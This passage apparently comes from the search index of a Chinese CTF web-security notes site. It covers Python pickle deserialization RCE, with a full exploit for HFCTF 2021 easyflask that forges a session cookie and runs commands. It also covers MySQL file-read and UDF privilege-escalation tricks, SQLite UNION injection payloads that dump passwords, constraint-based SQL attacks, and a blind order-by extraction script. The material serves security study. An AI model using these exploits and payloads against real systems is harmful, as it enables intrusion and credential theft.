<p>\u800c\u4e14\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\uff0c\u56e0\u4e3a\u7f16\u7a0b\u8bed\u8a00\u9700\u8981\u6839\u636e\u53cd\u5e8f\u5217\u5316\u5b57\u7b26\u4e32\u53bb\u89e3\u6790\u51fa\u81ea\u5df1\u72ec\u7279\u7684\u8bed\u8a00\u6570\u636e\u7ed3\u6784\uff0c\u6240\u4ee5\u5c31\u5fc5\u987b\u8981\u5728\u5185\u90e8\u628a\u89e3\u6790\u51fa\u6765\u7684\u7ed3\u6784\u53bb\u6267\u884c\u4e00\u4e0b\u3002\u5982\u679c\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u4e2d\u51fa\u73b0\u95ee\u9898\uff0c\u4fbf\u53ef\u80fd\u76f4\u63a5\u9020\u6210RCE\u6f0f\u6d1e.</p> <p>\u53e6\u5916pickle.loads\u4f1a\u89e3\u51b3import \u95ee\u9898\uff0c\u5bf9\u4e8e\u672a\u5f15\u5165\u7684module\u4f1a\u81ea\u52a8\u5c1d\u8bd5import\u3002\u90a3\u4e48\u4e5f\u5c31\u662f\u8bf4\u6574\u4e2apython\u6807\u51c6\u5e93\u7684\u4ee3\u7801\u6267\u884c\u3001\u547d\u4ee4\u6267\u884c\u51fd\u6570\u90fd\u53ef\u4ee5\u8fdb\u884c\u4f7f\u7528\u3002 https://docs.python.org/3.7/library/pickle.html</p> <p></p> <p>\u5c06\u4e4b\u524d\u538b\u5165\u6808\u4e2d\u7684\u5143\u7ec4\u548c\u53ef\u8c03\u7528\u5bf9\u8c61\u5168\u90e8\u5f39\u51fa , \u7136\u540e\u5c06\u8be5\u5143\u7ec4\u4f5c\u4e3a\u53ef\u8c03\u7528\u53c2\u6570\u7684\u5bf9\u8c61\u5e76\u6267\u884c\u8be5\u5bf9\u8c61 \u3002\u6700\u540e\u5c06\u7ed3\u679c\u538b\u5165\u5230\u6808\u4e2d </p> <p>\u4e8b\u5b9e\u4e0a , <code>R</code>\u64cd\u4f5c\u7801\u5c31\u662f <code>__reduce__()</code> \u9b54\u672f\u51fd\u6570\u7684\u5e95\u5c42\u5b9e\u73b0 . \u800c\u5728\u53cd\u5e8f\u5217\u5316\u8fc7\u7a0b\u7ed3\u675f\u7684\u65f6\u5019 , Python \u8fdb\u7a0b\u4f1a\u81ea\u52a8\u8c03\u7528 <code>__reduce__()</code> \u9b54\u672f\u65b9\u6cd5 . \u5982\u679c\u53ef\u4ee5\u63a7\u5236\u88ab\u8c03\u7528\u51fd\u6570\u7684\u53c2\u6570 , Python \u8fdb\u7a0b\u5c31\u53ef\u4ee5\u6267\u884c\u6076\u610f\u4ee3\u7801 .</p> <p>\u5728python2\u4e2d\u53ea\u6709\u5185\u7f6e\u7c7b\u624d\u6709<code>__reduce__</code>\u65b9\u6cd5\uff0c\u5373\u7528<code>class A(object)</code>\u58f0\u660e\u7684\u7c7b\uff0c\u800c<code>python3</code>\u4e2d\u5df2\u7ecf\u9ed8\u8ba4\u90fd\u662f\u5185\u7f6e\u7c7b\u4e86</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","title":"\u6f0f\u6d1e\u53ef\u80fd\u51fa\u73b0\u7684\u4f4d\u7f6e","text":"<ol> <li> <p>\u89e3\u6790\u8ba4\u8bc1token\u3001session\u7684\u65f6\u5019</p> </li> <li> <p>\u5c06\u5bf9\u8c61Pickle\u540e\u5b58\u50a8\u6210\u78c1\u76d8\u6587\u4ef6</p> </li> <li> <p>\u5c06\u5bf9\u8c61Pickle\u540e\u5728\u7f51\u7edc\u4e2d\u4f20\u8f93</p> </li> <li> <p>\u53c2\u6570\u4f20\u9012\u7ed9\u7a0b\u5e8f</p> </li> </ol> <p>\u4ec0\u4e48\u53ebRCE\u554a</p> <pre><code>import pickle\nimport os\n\nclass Test2(object):\n    def __reduce__(self):\n        #\u88ab\u8c03\u7528\u51fd\u6570\u7684\u53c2\u6570\n        cmd = \"ls\" \n        return (os.system,(cmd,))\n\nif __name__ == \"__main__\":\n    test = Test2()\n    #\u6267\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\n    result1 = pickle.dumps(test)\n    #\u6267\u884c\u53cd\u5e8f\u5217\u5316\u64cd\u4f5c\n    result2 = pickle.loads(result1)\n\n# __reduce__()\u9b54\u6cd5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c:\n# return(os.system,(cmd,))\n# 1.\u6ee1\u8db3\u8fd4\u56de\u4e00\u4e2a\u5143\u7ec4\uff0c\u5143\u7ec4\u4e2d\u6709\u4e24\u4e2a\u53c2\u6570\n# 2.\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u88ab\u8c03\u7528\u51fd\u6570 : os.system()\n# 3.\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u4e00\u4e2a\u5143\u7ec4:(cmd,),\u5143\u7ec4\u4e2d\u88ab\u8c03\u7528\u7684\u53c2\u6570 cmd\n# 4. \u56e0\u6b64\u5e8f\u5217\u5316\u65f6\u88ab\u89e3\u6790\u6267\u884c\u7684\u4ee3\u7801\u662f os.system(\"/usr/bin/id\")\n</code></pre> <p></p> <p>\u8fd9\u4e2a\u4ee3\u7801\u6267\u884c\u6bd4Java\u53cd\u5e8f\u5217\u5316\u8981\u5bb9\u6613\u5f88\u591a</p>"},{"location":"web/serialize/python/Pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#hfctf-2021-finaleasyflask","title":"[HFCTF 2021 Final]easyflask","text":"<p>\u4e0d\u653e\u5b8c\u5168\u7684\u9898\u89e3\u4e86\uff1a</p> <pre><code>#!/usr/bin/python3.6\nimport os\nimport pickle\n\nfrom base64 import b64decode\nfrom flask import Flask, request, render_template, session\n\napp = Flask(__name__)\napp.config[\"SECRET_KEY\"] = \"*******\"\n\nUser = type('User', (object,), {\n    'uname': 'test',\n    'is_admin': 0,\n    '__repr__': lambda o: o.uname,\n})\n\n\n@app.route('/', methods=('GET',))\ndef index_handler():\n    if not session.get('u'):\n        u = pickle.dumps(User())\n        session['u'] = u\n    return \"/file?file=index.js\"\n\n\n@app.route('/file', methods=('GET',))\ndef file_handler():\n    path = request.args.get('file')\n    path = os.path.join('static', path)\n    if not os.path.exists(path) or os.path.isdir(path) \\\n            or '.py' in path or '.sh' in path or '..' in path or \"flag\" in path:\n        return 'disallowed'\n\n    with open(path, 'r') as fp:\n        content = fp.read()\n    return content\n\n\n@app.route('/admin', methods=('GET',))\ndef admin_handler():\n    try:\n        u = session.get('u')\n        if isinstance(u, dict):\n            u = b64decode(u.get('b'))\n        u = pickle.loads(u)\n    except Exception:\n        return 'uhh?'\n\n    if u.is_admin == 1:\n        return 'welcome, admin'\n    else:\n        return 'who are you?'\n\n\nif __name__ == '__main__':\n    app.run('0.0.0.0', port=80, debug=False)\n</code></pre> <p>paylaod:</p> <pre><code>import base64\nimport pickle\nfrom flask.sessions import SecureCookieSessionInterface\nimport re\nimport pickletools\nimport requests\n\nurl=\"\"\n\ndef get_secret_key():\n    target = url + \"/file/?file=/proc/self/environ\"\n    r = requests.get(target)\n    key = re.findall('key=(.*?)OLDPWD',r.text)\n    return  str(key[0])\nsecret_key = get_secret_key()\n\nclass FakeApp:\n    secret_key =secret_key\nclass User(object):\n    def __reduce__(self):\n        import os\n        cmd = \"cat /flag &gt; /tmp/test1\"\n        return  (os.system,(cmd,))\nexp = {\"b\":base64.b64encode(pickle.dumps(User()))}\n\nprint(exp)\nfake_app=FakeApp()\nsession_interface = SecureCookieSessionInterface()\nserialize = session_interface.get_signing_serializer(fake_app)\ncookie = serialize.dumps({'u':exp})\nprint(cookie)\n\nheaders = {\n    \"Accept\":\"*/*\",\n    \"Cookie\":\"session{0}\".format(cookie)\n}\nreq = requests.get(url+\"/admin\",headers=headers)\n\nreq = requests.get(url+\"/file?file=/tmp/test1\",headers=headers)\nprint(req.text)\n</code></pre>"},{"location":"web/sql/little_trick/","title":"little trick","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"web/sql/little_trick/#_1","title":"\u7279\u6b8a\u5b57\u7b26","text":"<pre><code>&lt;?php\nmysql_connect(\"localhost\",\"root\",\"root\");\nmysql_select_db (\"test\");\nmysql_query(\"set names utf8\");\nfor($i = 0 ; $i &lt; 256 ; $i++){\n    $c = chr($i);\n    $name = mysql_real_escape_string('hehe' . $c);\n    $sql = \"SELECT * FROM `name` WHERE `name` = '{$name}'\";\n    $row = mysql_fetch_array(mysql_query($sql));\n    if ($row['name'] == 'aa') {\n        echo \"{$c} &lt;br/&gt;\";\n    }\n}\nPlain Text\n</code></pre> <p>\u4e00\u4e2a\u5c0ftrick</p> <p>\u81ea\u5df1\u8dd1\u4e00\u8dd1\u5c31\u77e5\u9053\u662f\u4ec0\u4e48\u610f\u601d\u4e86</p> <p>mysql\u67e5\u8be2\u51fa\u6765\u7684\u6570\u636e\u6bd4\u5982$id</p> <p>$id=a</p> <p>$id=a+\u4efb\u610f\u4e0b\u56fe\u91cc\u9762\u7684\u5b57\u7b26</p> <p></p> <p></p>"},{"location":"web/sql/little_trick/#mysql","title":"mysql\u4efb\u610f\u6587\u4ef6\u8bfb","text":"<p>\u539f\u7406\uff1a</p> <p>\u5f53\u670d\u52a1\u7aef\u6267\u884cload data local infile\u65f6\uff0c\u4f1a\u4ece\u5ba2\u6237\u7aef\u4f1a\u8bfb\u53d6\u5bf9\u5e94\u7684\u6587\u4ef6\u3002 //load data infile\u5219\u662f\u4ece\u670d\u52a1\u7aef\u672c\u8eab\u8bfb\u53d6</p> <ol> <li> <p>mysql\u5ba2\u6237\u7aef\u8fde\u63a5\u670d\u52a1\u7aef\u65f6\uff0c\u670d\u52a1\u7aef\u53ef\u4ee5\u8ba9\u5ba2\u6237\u7aef\u6267\u884csql\u8bed\u53e5\uff0c</p> </li> <li> <p>\u6240\u4ee5\u4f2a\u9020\u4e00\u4e2a\u670d\u52a1\u7aef\uff0c\u8ba9\u5ba2\u6237\u7aef\u8fde\u63a5\u5e76\u6267\u884cload data local infile\u5373\u53ef\u4efb\u610f\u6587\u4ef6\u8bfb\u3002</p> </li> </ol> <p>https://github.com/ev0A/Mysqlist</p> <p>\u4f8b\u5b50: phpmyadmin\u5f00\u542f\u8fdc\u7a0b\u767b\u9646\u540e\u5c31\u4f1a\u51fa\u73b0\u8be5\u6f0f\u6d1e\uff08\u8fd9\u662f\u4e00\u4e2a\u57fa\u4e8eweb\u7684sql\u7ba1\u7406\u8f6f\u4ef6\uff09</p>"},{"location":"web/sql/little_trick/#udf","title":"udf\u63d0\u6743","text":"<p>\u8fd9\u4e2a\u6211\u4e0d\u4f1a\uff0c\u6240\u4ee5copy\u4e0b\u6765\u4e86</p> <p>\u5982\u679c\u7406\u89e3\u4e0d\u4e86\u53ef\u4ee5\u7c7b\u6bd4\u4e4b\u524d\u6240\u63cf\u8ff0\u7684linux\u4e0b\u7684ld_preload</p> <p>\u5927\u81f4\u6d41\u7a0b\u5982\u4e0b\uff0c\u5c06udf\u6587\u4ef6windows\u4e3adll\u6587\u4ef6 ,linux\u4e3aso\u6587\u4ef6\u5bfc\u5165\u670d\u52a1\u5668mysql\u63d2\u4ef6\u76ee\u5f55\u5373\u53ef\u3002</p> <p>\u53ef\u4ee5\u81ea\u5df1\u5199\u4e00\u4e9budf\u6587\u4ef6\u6765\u7f16\u8bd1\u3002</p> <p>\u63a8\u8350sqlmap\u63d0\u4f9b\u7684udf\u6587\u4ef6</p> <p>https://github.com/sqlmapproject/sqlmap/tree/master/data/udf</p> <p>\u56e0\u4e3audf\u6587\u4ef6\u8f83\u5927\uff0c\u8be6\u7ec6\u70b9\u51fb\u8fd9\u91cc</p> <p>https://files.cnblogs.com/files/kagari/udf.js</p> <p>\u9ad8\u7248\u672c\u4e2dmysql\u65e0\u6cd5\u5411/usr\u76ee\u5f55\u5199\u6587\u4ef6\uff0c\u53ef\u4ee5\u5bfc\u5165\u5230/tmp\uff0c\u4e4b\u540emv\u5230/usr/lib/mysql/plugin\u4e0b</p> <p>\u5bfc\u5165\u6210\u529f\u4e4b\u540e\uff0c\u5982\u679c\u6267\u884c\u547d\u4ee4\u4e3a\u7a7a\uff0c\u5219\u4eca\u513f\u53c2\u8003https://www.cyberciti.biz/faq/ubuntu-linux-howto-disable-apparmor-commands/</p> <pre><code>\u6267\u884cln -s /etc/apparmor.d/usr.sbin.mysqld /etc/apparmor.d/disable/apparmor_parser -R /etc/apparmor.d/usr.sbin.mysqldservice mysql restart\nPlain Text\n</code></pre>"},{"location":"web/sql/sqlite/","title":"sqlite","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>SQLite \u662f\u4e00\u4e2a\u8f6f\u4ef6\u5e93\uff0c\u5b9e\u73b0\u4e86\u81ea\u7ed9\u81ea\u8db3\u7684\u3001\u65e0\u670d\u52a1\u5668\u7684\u3001\u96f6\u914d\u7f6e\u7684\u3001\u4e8b\u52a1\u6027\u7684 SQL \u6570\u636e\u5e93\u5f15\u64ce\u3002SQLite \u662f\u5728\u4e16\u754c\u4e0a\u6700\u5e7f\u6cdb\u90e8\u7f72\u7684 SQL \u6570\u636e\u5e93\u5f15\u64ce\u3002SQLite \u6e90\u4ee3\u7801\u4e0d\u53d7\u7248\u6743\u9650\u5236\u3002</p> <p>sqlite\u662f\u8f7b\u91cf\u7ea7\u7684\u6570\u636e\u5e93\uff0c\u5728\u5f00\u53d1\u7684\u8fc7\u7a0b\u4e2d\u4f1a\u7ecf\u5e38\u88ab\u4f7f\u7528\uff0c\u5f00\u53d1\u5b8c\u6210\u4e4b\u540e\u624d\u8f6c\u6362\u4e3amysql</p>"},{"location":"web/sql/sqlite/#_1","title":"\u8bed\u6cd5","text":"<p>\u56e0\u4e3a\u6211\u4e5f\u6728\u6709\u7cfb\u7edf\u7684\u5b66\u4e60\u8fc7\uff0c\u53ea\u80fd\u751f\u642c\u4e86</p>"},{"location":"web/sql/sqlite/#sqlite_master","title":"sqlite_master","text":"<p>sqlite_master\u8868\u4e2d\u4fdd\u5b58\u6570\u636e\u5e93\u8868\u7684\u5173\u952e\u4fe1\u606f\u3002</p> <p>\u4ecesqlite_master\u67e5\u8868\u540d:</p> <p>sqlite&gt;selecttbl_namefromsqlite_masterwheretype='table';</p> <p>\u7c7b\u4f3c\u662fmysql\u4e2d\u7684information-schema\u5143\u6570\u636e\u5e93\u7684\u4fe1\u606f\u3002</p> <p>\u67e5\u7248\u672c\u3002</p> <p>\u67e5\u8868\u540d\u548c\u5b57\u6bb5</p> <pre><code>0' union select1,2,sqlite_version();\n0' union select 1,2,sql from sqlite_master;\nor\n0' union select 1,2,sql from sqlite_masterwhere type='table';\nor\n0' union select 1,2,sqlfrom sqlite_master where type='table' and name='user_data';\nPlain Text\n</code></pre> <p>\u591a\u6761\u8bb0\u5f55\u65f6\u53ef\u4ee5\u4f7f\u7528group_concat\u805a\u5408\u6216\u8005\u4f7f\u7528limit</p> <pre><code>0' union select 1,2,group_concat(tbl_name)FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' --\nPlain Text\n</code></pre> <p>\u6216\u8005\u4f7f\u7528limit\u6765\u8f93\u51fa\u4e00\u884c\u7ed3\u679c</p> <pre><code>0' union select1,2,tbl_name FROM sqlite_master WHERE type='table' and tbl_name NOT like'sqlite_%' limit 2 offset 1 --\nPlain Text\n</code></pre> <p>\u53e6\u5916\u53ef\u4ee5\u901a\u8fc7\u4e0b\u9762\u7684payload\u83b7\u53d6\u5230\u683c\u5f0f\u5316\u8fc7\u7684\u5217\u540d\uff1a</p> <pre><code>0' union select1,2,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr((substr(sql,instr(sql,'(')+1)),instr((substr(sql,instr(sql,'(')+1)),'`')),\"TEXT\",''),\"INTEGER\",''),\"AUTOINCREMENT\",''),\"PRIMARYKEY\",''),\"UNIQUE\",''),\"NUMERIC\",''),\"REAL\",''),\"BLOB\",''),\"NOTNULL\",''),\",\",'~~') from sqlite_master where type='table' andname='user_data' --\nPlain Text\n</code></pre> <p>\u67e5\u6570\u636e</p> <pre><code>0' union selectid,name,passwd from user_data;\nPlain Text\n</code></pre> <p>\u4f7f\u7528group_concat\u8fde\u63a5\u67e5\u8be2\u7ed3\u679c</p> <pre><code>0' union select1,2,group_concat(passwd) from user_data;\nPlain Text\n</code></pre> <p>\u5728\u521b\u5efa\u8868\u65f6\u53ef\u4ee5\u7528as\u6765\u590d\u5236\u53e6\u4e00\u4e2a\u8868\u4e2d\u7684\u6570\u636e\u3002\u8fd9\u91cc\u6211\u4eec\u5c31\u53ef\u4ee5\u7528as select sql from sqlite_master\u6765\u590d\u5236sqlite_master\u7684sql\u5b57\u6bb5\u3002</p> <p>\u5177\u4f53\u53c2\u8003\uff1a</p> <p>sqlite\u6ce8\u5165\u7684\u4e00\u70b9\u603b\u7ed3 - \u5148\u77e5\u793e\u533a</p> <p>\u5148\u77e5\u793e\u533a\uff0c\u5148\u77e5\u5b89\u5168\u6280\u672f\u793e\u533a</p> <p>https://xz.aliyun.com/t/8627</p>"},{"location":"web/sql/sqlite/#sqlite-bypass","title":"Sqlite bypass","text":"<p>\u76ee\u524d\u5c31\u78b0\u5230\u8fd9\u4e00\u4e2a\uff0c\u800c\u4e14\u7406\u89e3\u8d77\u6765\u6709\u70b9\u9ebb\u70e6</p> <p>\u662fsqlite\u81ea\u8eab\u7684\u6027\u8d28\uff0c\u901a\u8fc7\u95ed\u5408\u6765\u5f3a\u884c\u62fc\u51d1\u51fasql\u6ce8\u5165\u7684\u8bed\u53e5\u3002</p> <p>\u6211\u4eec\u5728\u4f7f\u7528sqlite_master\u65f6\u4f7f\u7528\u9519\u8bef\u7684\u8bed\u6cd5\uff0csqlite\u5c06\u4f1a\u5ffd\u7565\u540e\u9762\u5217\u7684\u540d\u79f0\uff0c\u65e0\u8bba\u5217\u7684\u540d\u79f0\u662f\u5426\u771f\u5b9e\u7684\u5b58\u5728\uff0c\u9664\u975e\u5728\u5217\u4e4b\u95f4\u653e\u7f6e\u3002</p> <p>select\u7684\u65f6\u5019\uff0c\u5f53\u5217\u540d\u7528\u7a7a\u767d\u5b57\u7b26\u9694\u5f00\u65f6\uff0csqlite\u53ea\u4f1a\u628a\u7a7a\u683c\u4e4b\u524d\u7684\u5b57\u7b26\u5f53\u505a\u5217\u540d\uff0c\u5e76\u4e14\u5ffd\u89c6\u7a7a\u683c\u540e\u7684\u5b57\u7b26</p> <p></p> <p>[]\u548c'\u3001\"\u3001`\u3001\u4e00\u6837\u53ef\u4ee5\u5305\u88f9\u5217\u540d</p> <p></p> <p>select [id][fdas3\"`] from test</p> <p>//1</p> <p>select [id]\"dgfsgfs\" from test</p> <p>//1</p> <p>select [id]fdas from test</p> <p>//1</p> <p>\u7b2c\u4e00\u4e2a\u5217\u540d\u53ef\u4ee5\u6b63\u5e38\u8bfb\u53d6\u3002\u7b2c\u4e8c\u4e2a\u5c31\u4f1a\u81ea\u52a8\u5ffd\u7565</p> <p>\" ' ` [] \u90fd\u53ef\u4ee5\u6b63\u5e38\u5305\u88f9\u5217\u540d</p> <p>insert\u8bed\u53e5\u4e5f\u5dee\u4e0d\u591a</p> <p>$sql = \"CREATE TABLE [aaa] as select [sql][ (dummy1TEXT, dummy2 TEXT, <code>]from sqlite_master;</code> 2);\";</p> <p>\u7b49\u4e8e</p> <p>create table [aaa] as select sql from sqlite_master</p> <p>\u67e5\u627esqlite_master\u4e2dsql\u5217\u7684\u503c\u653e\u5165aaa\u8868\u4e2d</p> <p>creat table [aaa] as select sql as[dummy1TEXT, dummy2 TEXT(table_name\u4f20\u53c2\u5185\u5bb9)&amp;columns[0][name]=]from sql_master;\u8fd9\u91cc\u662f\u7b2c\u4e00\u79cd\u89e3\u91ca\u7684\u65b9\u6cd5</p> <p>\u9898\u76ee\u6765\u6e90</p>"},{"location":"web/sql/sqlite/#zer0pts2020phpnantokaadmin","title":"[Zer0pts2020]phpNantokaAdmin","text":"<p>\u8fd9\u662f\u4e00\u9053sqlite\u6ce8\u5165\u7684\u9898\u76ee\uff0c\u8003\u5bdf\u70b9\uff1a\u6211\u4eec\u5728\u4f7f\u7528sqlite_master\u65f6\u4f7f\u7528\u9519\u8bef\u7684\u8bed\u6cd5\uff0csqlite\u5c06\u4f1a\u5ffd\u7565\u540e\u9762\u5217\u7684\u540d\u79f0\uff0c\u65e0\u8bba\u5217\u7684\u540d\u79f0\u662f\u5426\u771f\u5b9e\u7684\u5b58\u5728\uff0c\u9664\u975e\u5728\u5217\u4e4b\u95f4\u653e\u7f6e\u3002\uff1a</p> <p>table_name=[aaa] as select sql as[&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2</p> <p>sql = \"CREATE TABLE {table_name} (\";</p> <p>$sql .= \"dummy1 TEXT, dummy2 TEXT\";</p> <p>\u633a\u795e\u5947\u7684\uff0c\u9996\u5148\u4f7f\u7528[aaa]\u6765\u76f8\u5f53\u4e8e\u8986\u76d6\u6389sql.\u540e\u7684dummy1,dummy2\uff0c\u7531\u4e8e\u5355\u6b21\u4f20\u9012\u6570\u636e\u5b57\u7b26\u6570\u91cf\u7684\u9650\u5236\uff0c\u5728[]\u4e2d\u6211\u4eec\u4f20\u9012&amp;columns\u6765\u62fc\u63a5\u4f20\u9012\u8d85\u51fa\u5b57\u7b26\u7684\u51fd\u6570\uff0c\u4f46\u662f\u5728\u5b9e\u9645sqlite\u8fdb\u884c\u89e3\u6790\u7684\u65f6\u5019\uff0c\u53c8\u7531\u4e8e\u5728[]\u4e4b\u540e\u88ab\u5ffd\u7565\u3002\u6700\u540e\u76f8\u5f53\u4e8e\uff1a</p> <p>creat table [aaa]as select sql from sqlite_master;</p> <p>creat table [aaa] as select sql as[dummy1 TEXT, dummy2 TEXT(table_name\u4f20\u53c2\u5185\u5bb9)&amp;columns[0][name]=]from sql_master;</p> <p>\u627e\u5230\u53e6\u5916\u4e00\u79cd\u89e3\u91ca:select\u7684\u65f6\u5019\uff0c\u5f53\u5217\u540d\u7528\u7a7a\u767d\u5b57\u7b26\u9694\u5f00\u65f6\uff0csqlite\u53ea\u4f1a\u628a\u7a7a\u683c\u4e4b\u524d\u7684\u5b57\u7b26\u5f53\u505a\u5217\u540d\uff0c\u5e76\u4e14\u5ffd\u89c6\u7a7a\u683c\u540e\u7684\u5b57\u7b26</p> <p>payload\u5c31\u4e3a\uff1a[aaa]as select [sql][&amp;columns[0][name]=]from sqlite_master;&amp;columns[0][type]=2</p>"},{"location":"web/sql/%E5%9F%BA%E4%BA%8E%E7%BA%A6%E6%9D%9F%E7%9A%84sql%E6%94%BB%E5%87%BB/","title":"\u57fa\u4e8e\u7ea6\u675f\u7684sql\u653b\u51fb","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u9996\u5148\u7ed9\u51fa\u4e0d\u662fsql\u6ce8\u5165\u7684sql</p> <p>\u7a0d\u5fae\u63cf\u8ff0\u4e00\u4e0b\uff1a\u5c31\u662f\u8bf4\uff0c\u5f53\u6211\u9650\u5b9asql\u4e2d\u67d0\u4e00\u4e2a\u53d8\u91cf\u7684\u503c\u7684\u957f\u5ea6\u65f6\uff0c\u82e5\u53d8\u91cf\u957f\u5ea6\u7684\u503c\u5c0f\u4e8e\u8be5\u503c\uff0c\u90a3\u4e48sql\u5728\u505a\u6bd4\u8f83\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u586b\u5145\u7a7a\u683c\u5206\u5272\u7b26\uff0c\u5f53\u53d8\u91cf\u7684\u957f\u5ea6\u5927\u4e8e\u8be5\u503c\u7684\u65f6\u5019\uff0c\u90a3\u4e48sql\u4f1a\u81ea\u52a8\u5730\u622a\u53d6\u8be5\u503c\u7684\u957f\u5ea6\u3002</p> <p>\u6bd4\u5982\u8bf4\u9650\u5236\u4e3a10\uff0c\u4e5f\u5c31\u662f\u8bfb10\u4f4d</p> <p>\u8f93\u5165100000\u5c31\u4f1a\u53d8\u6210100000%20%20%20%20\uff08%20\u5c31\u662f\u7a7a\u683c\uff09</p> <p>1145141919810\u5c31\u4f1a\u53d8\u62101145141919\uff0c\u540e\u9762\u76841919\u88ab\u622a\u65ad\u7b49\u629b\u5f03\u4e86</p> <p>1\u3001\u65b0\u5efa\u8868\u683c\u540d\u5b57\u4e3auser\uff0c\u8be5\u8868\u7684\u7ea6\u675f\u7684\u662f\u540d\u5b57\u548c\u5bc6\u7801\u957f\u5ea6\u4e0d\u80fd\u8d85\u8fc710</p> <pre><code>create table user(id int primary key auto_increment,//id\u5b57\u6bb5\uff0cint\u7c7b\u578b\uff0c\u5173\u952e\u5b57\uff0c\u81ea\u52a8\u589e\u52a0name varchar(10) not null,//name\u5b57\u6bb5\uff0c\u5b57\u7b26\u4e32\uff0c\u4e0d\u5141\u8bb8\u4e3a\u7a7apass varchar(10) not null)//year\u5b57\u6bb5\uff0cint\u7c7b\u578b\uff0c\u4e0d\u5141\u8bb8\u4e3a\u7a7a\nPlain Text\n</code></pre> <p>2\u3001\u63d2\u5165\u4e24\u6761\u6b63\u5e38\u6570\u636e</p> <pre><code>insert into user (name,pass) values (\"aiyou\",123456);insert into user (name,pass) values (\"admin\",123456);\nPlain Text\n</code></pre> <p>3\u3001\u63d2\u5165\u957f\u5ea6\u5927\u4e8e10\u7684\u7528\u6237\u540d</p> <pre><code>insert into user (name,pass) values (\"admin123456789\",123456);\nPlain Text\n</code></pre> <p>4\u3001\u67e5\u770b\u63d2\u5165\u7684\u6570\u636e\uff0c\u53d1\u73b0\u53ea\u4fdd\u7559\u4e86\u5341\u4e2a\u5b57\u7b26</p> <p></p> <p>5\u3001\u518d\u63d2\u5165\u4e00\u6761\u52a0\u7a7a\u683c\u7684\u7528\u6237\u540d\uff0c\u53d1\u73b0\u548c\u4e0d\u52a0\u7a7a\u683c\u63d2\u5165\u7684admin\u4e00\u6837</p> <p></p> <p>[SKCTF]login1</p>"},{"location":"web/sql/SQL_Injection/order_by_%E6%8E%92%E5%BA%8F%E6%B3%A8%E5%85%A5/","title":"order by \u6392\u5e8f\u6ce8\u5165","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5199\u4e0d\u52a8\u4e86\uff0ccopy\u4e86</p> <p>\u9996\u5148\u5047\u8bbe\u6709\u8fd9\u6837\u4e00\u5f20\u8868</p> <p></p> <p>\u6709\u4ee5\u4e0b\u4ee3\u7801</p> <pre><code>&lt;?php\n$servername = \"localhost\";\n$username = \"root\";\n$password = \"\";\n$dbname = \"ctf\";\n$conn = new mysqli($servername, $username, $password, $dbname);\n\nfunction check($s){\n         if(preg_match(\"/\\)|\\(|_|\\.|\\|/i\",$s))  #()_.|\n       {    \n             die('hack!'); \n       }\n   }\n$username=$_GET['username'];\ncheck($username);\n\n$sql = \"select * from user where username='$username'\";\n$result = $conn-&gt;query($sql);\n\nif ($result-&gt;num_rows &gt; 0) {\n    if($row = $result-&gt;fetch_assoc()) {\n        echo \"username: \" . $row[\"username\"].\"&lt;br&gt;\";\n    }\n}\n$conn-&gt;close();\n?&gt;\n</code></pre> <p>\u56e0\u4e3a()_.|\u88ab\u8fc7\u6ee4\uff0c\u6240\u4ee5\u6211\u4eec\u65e0\u6cd5\u4eceinformation_schema\u548c\u51fd\u6570\u83b7\u53d6\u4fe1\u606f\u3002</p> <p>\u73b0\u5728\u6211\u4eec\u8981\u83b7\u53d6admin\u7684flag\u7684hash\uff0c\u4f46\u662f\u6211\u4eec\u4e0d\u77e5\u9053\u5b57\u6bb5\u540d\uff0c\u4e14\u6ca1\u6709.\u4e0d\u80fd\u4f7f\u7528\u522b\u540d\u6216\u5b50\u67e5\u8be2\u7684\u65b9\u5f0f\u83b7\u53d6\uff0c\u53ef\u4ee5\u4f7f\u7528\u8fd9\u6837\u7684\u65b9\u6cd5\u3002</p> <p>\u4e0b\u9762\u6b63\u5f0f\u5f00\u59cb</p> <p>\u9996\u5148\u6211\u4eec\u77e5\u9053order by \u53ef\u4ee5\u6392\u5e8f\uff0c\u6240\u4ee5\u5229\u7528\u8fd9\u4e00\u70b9\u53ef\u4ee5\u8fdb\u884c\u5b57\u7b26\u4e32\u6bd4\u8f83\uff0c\u5982\u4e0b\u5c31\u662forder by \u5bf9admin\u8fdb\u884c\u5462\u6bd4\u8f83\u6211\u4eec\u73b0\u5728\u5c31\u5df2\u7ecf\u786e\u5b9a\u524d\u4e24\u4e2a\u5b57\u6bcd\u4e3aad\u4e86</p> <p></p> <p></p> <p>\u540c\u7406</p> <p></p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u77e5\u9053admin\u7684flag\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e3a7\u4e86\uff0c\u7ee7\u7eed</p> <p></p> <p></p> <p>\u73b0\u5728\u6211\u4eec\u77e5\u9053\uff0c\u524d\u4e24\u4e2a\u5b57\u7b26\u4e3a79\u4e86 //9\u7684ascii\u4e3a57\u800c:\u7684ascii\u4e3a58\uff0c\u6240\u4ee5:\u6bd49\u5927</p> <p>\u4ee5\u6b64\u6211\u4eec\u53ef\u4ee5\u5199\u51fa\u4ee5\u4e0b\u811a\u672c</p> <pre><code>import requests\n\nurl= 'http://127.0.0.1/mysql.php'\nflag=''\nfor i in range(50):\n    for j in range(48,128):\n        payload=\"?username=xxx' or 1=1 union select 1,2,'%s' order by 3 limit 